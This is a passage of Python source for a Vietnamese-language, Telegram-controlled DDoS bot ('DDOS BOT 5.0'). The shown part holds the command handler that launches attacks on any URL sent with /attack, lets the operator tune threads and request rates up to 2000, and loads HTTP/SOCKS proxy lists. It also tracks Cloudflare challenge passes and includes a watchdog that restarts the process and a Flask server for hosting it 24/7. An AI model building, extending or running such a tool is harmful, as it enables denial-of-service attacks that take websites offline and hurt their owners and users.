        errors = attack_stats.get('errors', 0)
        cf_challenges = attack_stats.get('cf_challenges', 0)
        cf_passed = attack_stats.get('cf_passed', 0)
    
    send_telegram(f"""
⏹️ <b>ĐÃ DỪNG SAU {elapsed}s</b>
📊 <b>TỔNG KẾT:</b>
- Tổng: {total:,}
- Thành công: {success:,}
- Thất bại: {fail:,}
- Lỗi: {errors}
- CF Challenge: {cf_challenges}
- CF Passed: {cf_passed}
- Tốc độ TB: {rate:.1f} req/s
- Tốc độ Max: {max_speed:.1f} req/s
💾 Proxy đã lưu: {PROXY_BACKUP_FILE}
    """, chat_id)

# =====================================================
# TELEGRAM LISTENER
# =====================================================
def telegram_listener():
    global is_running, attack_thread, chat_id_saved
    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
    global THREAD_COUNT, REQUESTS_PER_SECOND
    
    last_update_id = 0
    
    send_telegram("""
🚀 <b>DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY</b>
✅ Đã khởi động thành công!
⚡ Tốc độ tối đa: 500+ req/s
📌 Hỗ trợ HTTP, SOCKS4, SOCKS5
💾 Tự động lưu proxy vào backup
🔄 Reload proxy mỗi 10 phút
❤️ Heartbeat mỗi 30 phút

📋 <b>LỆNH:</b>
<code>/attack URL</code> - Tấn công target
<code>/stop</code> - Dừng tấn công
<code>/status</code> - Xem trạng thái
<code>/proxy</code> - Số proxy hiện có
<code>/backup</code> - Xem backup proxy
<code>/reloadproxy</code> - Tải lại proxy từ backup
<code>/threads N</code> - Đổi số luồng
<code>/speed N</code> - Đổi tốc độ
<code>/help</code> - Trợ giúp

📤 <b>GỬI FILE PROXY:</b>
Gửi file .txt chứa proxy - Bot tự động lưu!
    """)
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 10}
            r = requests.get(url, params=params, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        msg = update.get('message', {})
                        chat_id = msg.get('chat', {}).get('id')
                        
                        if not chat_id:
                            continue
                        
                        chat_id_saved = chat_id
                        try:
                            with open('chat_id.txt', 'w') as f:
                                f.write(str(chat_id))
                        except:
                            pass
                        
                        # Xử lý file proxy - TỰ ĐỘNG LƯU
                        document = msg.get('document')
                        if document:
                            file_name = document.get('file_name', '')
                            if file_name.endswith('.txt'):
                                file_id = document['file_id']
                                handle_proxy_file(file_id, file_name, chat_id)
                        
                        # Xử lý lệnh
                        text = msg.get('text', '').strip()
                        if not text:
                            continue
                        
                        cmd = text.lower()
                        
                        if cmd.startswith('/attack'):
                            parts = text.split(maxsplit=1)
                            if len(parts) >= 2:
                                target = parse_target_url(parts[1].strip())
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công! Dùng /stop trước.", chat_id)
                                else:
                                    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                    if total_proxy == 0:
                                        send_telegram("⚠️ Không có proxy! Gửi file .txt hoặc dùng /reloadproxy để tải từ backup.", chat_id)
                                    else:
                                        send_telegram(f"🎯 Target: {target['url']}", chat_id)
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                            else:
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công!", chat_id)
                                else:
                                    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                    if total_proxy == 0:
                                        send_telegram("⚠️ Không có proxy! Gửi file .txt hoặc dùng /reloadproxy.", chat_id)
                                    else:
                                        target = current_target
                                        send_telegram(f"🎯 Dùng target mặc định: {target['url']}", chat_id)
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                        
                        elif cmd == '/stop':
                            if is_running:
                                stop_event.set()
                                is_running = False
                                send_telegram("⛔ Đã dừng tấn công!", chat_id)
                            else:
                                send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)
                        
                        elif cmd == '/status':
                            send_telegram(get_stats_text(), chat_id)
                        
                        elif cmd == '/proxy':
                            send_telegram(f"""
🌐 <b>THỐNG KÊ PROXY</b>
HTTP: {len(proxy_http)}
SOCKS5: {len(proxy_socks5)}
SOCKS4: {len(proxy_socks4)}
Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
🕐 Cập nhật: {datetime.fromtimestamp(proxy_update_time).strftime('%H:%M:%S') if proxy_update_time > 0 else 'Chưa có'}
💾 Backup file: {PROXY_BACKUP_FILE}
                            """, chat_id)
                        
                        elif cmd == '/backup':
                            if os.path.exists(PROXY_BACKUP_FILE):
                                try:
                                    with open(PROXY_BACKUP_FILE, 'r', encoding='utf-8') as f:
                                        backup_data = json.load(f)
                                    send_telegram(f"""
💾 <b>BACKUP PROXY</b>
📁 File: {PROXY_BACKUP_FILE}
📊 Số proxy: {len(backup_data)}
🕐 Cập nhật: {datetime.fromtimestamp(os.path.getmtime(PROXY_BACKUP_FILE)).strftime('%Y-%m-%d %H:%M:%S')}
                                    """, chat_id)
                                except:
                                    send_telegram("❌ Không thể đọc file backup.", chat_id)
                            else:
                                send_telegram("❌ Chưa có file backup.", chat_id)
                        
                        elif cmd == '/reloadproxy':
                            if reload_proxy_from_backup():
                                save_proxy_to_text_file()
                                send_telegram(f"✅ Đã tải lại proxy từ backup: {len(proxy_list)} proxy", chat_id)
                            else:
                                send_telegram("❌ Không có backup proxy.", chat_id)
                        
                        elif cmd.startswith('/threads'):
                            try:
                                new_count = int(text.split()[1])
                                if 1 <= new_count <= 2000:
                                    THREAD_COUNT = new_count
                                    send_telegram(f"✅ Đã cập nhật số luồng: {THREAD_COUNT}", chat_id)
                                else:
                                    send_telegram("❌ Số luồng phải từ 1-2000", chat_id)
                            except:
                                send_telegram("❌ /threads <số>", chat_id)
                        
                        elif cmd.startswith('/speed'):
                            try:
                                new_speed = int(text.split()[1])
                                if 1 <= new_speed <= 2000:
                                    REQUESTS_PER_SECOND = new_speed
                                    send_telegram(f"✅ Đã cập nhật tốc độ: {REQUESTS_PER_SECOND} req/s", chat_id)
                                else:
                                    send_telegram("❌ Tốc độ phải từ 1-2000", chat_id)
                            except:
                                send_telegram("❌ /speed <số>", chat_id)
                        
                        elif cmd == '/help':
                            help_text = """
<b>🤖 DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY</b>

📌 <b>CHẠY 24/7 - TỐC ĐỘ CAO</b>

📤 <b>GỬI FILE PROXY:</b>
Gửi file .txt chứa danh sách proxy
Bot tự động lưu vào backup
Hỗ trợ: HTTP, SOCKS4, SOCKS5
Định dạng:
<code>ip:port</code>
<code>socks5://user:pass@ip:port</code>
<code>user:pass@ip:port</code>

📋 <b>LỆNH:</b>
<code>/attack URL</code> - Tấn công
<code>/stop</code> - Dừng
<code>/status</code> - Trạng thái
<code>/proxy</code> - Số proxy
<code>/backup</code> - Xem backup
<code>/reloadproxy</code> - Tải lại từ backup
<code>/threads N</code> - Đổi luồng
<code>/speed N</code> - Đổi tốc độ
<code>/help</code> - Trợ giúp

⚡ <b>TỐI ƯU:</b>
- 800 luồng
- 500 req/s
- 120s mỗi đợt
- Cooldown 30 phút
- Tự động lưu proxy
- Cache DNS
- Pool connection
- Heartbeat 30 phút

💾 <b>FILE BACKUP:</b>
{PROXY_BACKUP_FILE}
                            """
                            send_telegram(help_text, chat_id)
            
            time.sleep(2)
        except Exception:
            time.sleep(5)

# =====================================================
# HEARTBEAT
# =====================================================
def heartbeat_loop():
    global heartbeat_count
    
    while True:
        time.sleep(60)
        heartbeat_count += 1
        
        if heartbeat_count % 30 == 0:
            with stats_lock:
                total = attack_stats['total_requests']
                uptime = int(time.time() - bot_start_time)
                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
            
            send_telegram(f"""
❤️ <b>HEARTBEAT #{heartbeat_count}</b>
⏱ Uptime: {uptime_str}
📨 Tổng req: {total:,}
🌐 HTTP:{len(proxy_http)} S5:{len(proxy_socks5)} S4:{len(proxy_socks4)}
💾 Backup: {PROXY_BACKUP_FILE}
⚡ Tốc độ cài: {REQUESTS_PER_SECOND} req/s
🧵 Luồng: {THREAD_COUNT}
📌 Status: {'🟢 RUNNING' if is_running else '🔴 IDLE'}
            """)

# =====================================================
# WATCHDOG
# =====================================================
def watchdog():
    while True:
        time.sleep(60)
        active = threading.active_count()
        if active < 3:
            send_telegram("⚠️ WATCHDOG: PHÁT HIỆN CRASH! ĐANG RESTART...")
            time.sleep(3)
            try:
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                pass

# =====================================================
# WEB SERVER CHO RENDER.COM
# =====================================================
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return jsonify({
        'status': 'DDOS Bot 5.0 - Auto Save Proxy',
        'uptime': int(time.time() - bot_start_time),
        'proxy_count': len(proxy_list),
        'http_proxies': len(proxy_http),
        'socks5_proxies': len(proxy_socks5),
        'socks4_proxies': len(proxy_socks4),
        'threads': THREAD_COUNT,
        'speed': REQUESTS_PER_SECOND,
        'is_attacking': is_running,
        'total_requests': attack_stats['total_requests'],
        'backup_file': PROXY_BACKUP_FILE
    })

@web_app.route('/health')
def health():
    return 'OK', 200

@web_app.route('/stats')
def stats():
    return jsonify({
        'uptime': int(time.time() - bot_start_time),
        'proxy_count': len(proxy_list),
        'http_proxies': len(proxy_http),
        'socks5_proxies': len(proxy_socks5),
        'socks4_proxies': len(proxy_socks4),
        'threads': THREAD_COUNT,
        'speed': REQUESTS_PER_SECOND,
        'is_attacking': is_running,
        'total_requests': attack_stats['total_requests'],
        'success_count': attack_stats['success_count'],
        'fail_count': attack_stats['fail_count'],
        'heartbeat': heartbeat_count,
        'backup_file': PROXY_BACKUP_FILE
    })

@web_app.route('/proxy')
def get_proxies():
    return jsonify({
        'total': len(proxy_list),
        'http': len(proxy_http),
        'socks5': len(proxy_socks5),
        'socks4': len(proxy_socks4),
        'backup_file': PROXY_BACKUP_FILE
    })

def run_web_server():
    port = int(os.environ.get('PORT', 10000))
    print(f"[+] Web server starting on port {port}")
    web_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# =====================================================
# KHỞI CHẠY CHÍNH
# =====================================================
if __name__ == "__main__":
    bot_start_time = time.time()
    
    # Tải proxy từ backup trước
    http, socks5, socks4 = load_proxy_from_backup()
    total_backup = len(http) + len(socks5) + len(socks4)
    
    if total_backup > 0:
        proxy_http = http
        proxy_socks5 = socks5
        proxy_socks4 = socks4
        proxy_list = http + socks5 + socks4
        proxy_update_time = time.time()
        print(f"[+] Đã tải proxy từ backup: HTTP={len(proxy_http)} SOCKS5={len(proxy_socks5)} SOCKS4={len(proxy_socks4)}")
        # Ghi vào file txt
        save_proxy_to_text_file()
    else:
        # Thử tải từ file proxies.txt
        if os.path.exists("proxies.txt"):
            http, socks5, socks4 = load_proxies("proxies.txt")
            total = len(http) + len(socks5) + len(socks4)
            if total > 0:
                proxy_http = http
                proxy_socks5 = socks5
                proxy_socks4 = socks4
                proxy_list = http + socks5 + socks4
                proxy_update_time = time.time()
                # Lưu vào backup
                for proxy in proxy_list:
                    save_proxy_to_backup(proxy)
                print(f"[+] Đã tải proxy từ file: HTTP={len(proxy_http)} SOCKS5={len(proxy_socks5)} SOCKS4={len(proxy_socks4)}")
            else:
                print("[+] Chưa có proxy. Gửi file .txt qua Telegram để tạo backup.")
        else:
            print("[+] Chưa có proxy. Gửi file .txt qua Telegram để tạo backup.")
            with open("proxies.txt", 'w') as f:
                f.write("# Proxy list - Tự động lưu\n")
                f.write("# Gửi file .txt qua Telegram để cập nhật proxy\n")
    
    print("="*60)
    print("🔥 DDOS BOT 5.0 - TỰ ĐỘNG LƯU PROXY")
    print("="*60)
    print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"[+] HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}")
    print(f"[+] Tổng proxy: {len(proxy_list)}")
    print(f"[+] Backup file: {PROXY_BACKUP_FILE}")
    print(f"[+] Luồng: {THREAD_COUNT}")
    print(f"[+] Tốc độ: {REQUESTS_PER_SECOND} req/s")
    print("="*60)
    print("[+] BOT ĐÃ SẴN SÀNG - CHẠY 24/7")
    print("[+] TỰ ĐỘNG LƯU PROXY KHI NHẬN FILE")
    print("[+] GỬI FILE .txt QUA TELEGRAM ĐỂ CẬP NHẬT")
    print("="*60)
    
    # Khởi chạy web server
    threading.Thread(target=run_web_server, daemon=True).start()
    
    # Khởi chạy các thread bot
    threading.Thread(target=telegram_listener, daemon=True).start()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=auto_reload_proxy, daemon=True).start()
    threading.Thread(target=watchdog, daemon=True).start()
    
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        send_telegram("⛔ Bot đã dừng bởi người dùng.")
        print("[+] Bot đã dừng.")
